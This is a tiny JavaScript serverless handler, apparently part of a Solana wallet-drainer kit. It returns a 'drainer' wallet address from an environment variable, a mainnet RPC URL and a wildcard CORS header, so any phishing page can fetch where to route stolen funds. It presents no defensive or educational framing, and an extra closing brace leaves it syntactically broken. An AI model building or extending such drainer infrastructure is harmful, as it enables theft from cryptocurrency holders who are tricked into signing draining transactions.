export default function handler(req, res) {
      res.setHeader('Access-Control-Allow-Origin', '*');
        res.status(200).json({
            drainer: process.env.DRAINER_WALLET,
                rpc: process.env.PUBLIC_RPC_URL || 'https://api.mainnet-beta.solana.com'
                  });
                  }
}